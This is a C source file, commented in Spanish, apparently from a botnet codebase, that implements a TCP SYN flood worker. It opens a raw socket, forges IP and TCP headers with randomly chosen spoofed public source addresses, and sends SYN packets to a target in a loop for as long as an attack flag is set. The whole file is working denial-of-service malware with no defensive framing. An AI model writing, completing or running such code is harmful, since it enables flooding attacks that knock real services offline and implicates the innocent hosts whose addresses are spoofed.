#include "../../include/botnet.h"
#include "../../include/compat/raw_structs.h" // Para nuestras estructuras de red a medida

// Prototipo de la función de checksum (definida en otro lugar, ej: dns_amp.c)
unsigned short csum(unsigned short *ptr, int nbytes);

// Estructura para la pseudo-cabecera usada en el cálculo del checksum TCP
struct pseudo_header {
    uint32_t source_address;
    uint32_t dest_address;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t tcp_length;
};

// IMPLEMENTACIÓN de la función que faltaba
// Genera una IP pública aleatoria para falsificar el origen.
static uint32_t generate_random_ip() {
    uint32_t ip;
    do {
        // Genera un número de 32 bits aleatorio
        ip = (uint32_t)rand();
    } while ((ip & 0xFF000000) == 0x0A000000 || // Excluye 10.0.0.0/8
             (ip & 0xFFF00000) == 0xAC100000 || // Excluye 172.16.0.0/12
             (ip & 0xFFFF0000) == 0xC0A80000 || // Excluye 192.168.0.0/16
             (ip & 0xFF000000) == 0x7F000000);  // Excluye 127.0.0.0/8
    return ip;
}

void *tcp_flood_worker(void *args) {
    struct target *target = (struct target *)args;
    int sock;
    char datagram[128];

    struct my_iphdr *iph = (struct my_iphdr *) datagram;
    struct my_tcphdr *tcph = (struct my_tcphdr *) (datagram + sizeof (struct my_iphdr));
    struct sockaddr_in sin; // ¡DECLARACIÓN QUE FALTABA!

    sin.sin_family = AF_INET;
    sin.sin_port = target->port;
    sin.sin_addr.s_addr = target->addr;

    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(sock < 0) { perror("socket"); return NULL; }
    
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof (one)) < 0) { perror("setsockopt"); close(sock); return NULL; }

    while (attack_running) {
        // Cabecera IP
        iph->ihl = 5; iph->version = 4; iph->tos = 0;
        iph->tot_len = sizeof (struct my_iphdr) + sizeof (struct my_tcphdr);
        iph->id = htonl(rand()); iph->frag_off = 0; iph->ttl = 255; iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        iph->saddr = generate_random_ip(); // ¡Ahora esta función existe!
        iph->daddr = target->addr;

        // Cabecera TCP
        tcph->source = htons(rand() % 65535 + 1024);
        tcph->dest = target->port;
        tcph->seq = htonl(rand());
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->fin=0; tcph->syn=1; tcph->rst=0; tcph->psh=0; tcph->ack=0; tcph->urg=0;
        tcph->window = htons(5840);
        tcph->check = 0;
        tcph->urg_ptr = 0;

        // Checksum TCP
        struct pseudo_header psh;
        psh.source_address = iph->saddr;
        psh.dest_address = iph->daddr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct my_tcphdr));

        char psh_buffer[sizeof(struct pseudo_header) + sizeof(struct my_tcphdr)];
        memcpy(psh_buffer, &psh, sizeof(struct pseudo_header));
        memcpy(psh_buffer + sizeof(struct pseudo_header), tcph, sizeof(struct my_tcphdr));
        tcph->check = csum((unsigned short*)psh_buffer, sizeof(psh_buffer));

        // Checksum IP
        iph->check = csum((unsigned short *) datagram, iph->tot_len);

        sendto(sock, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof (sin));
    }
    close(sock);
    return NULL;
}
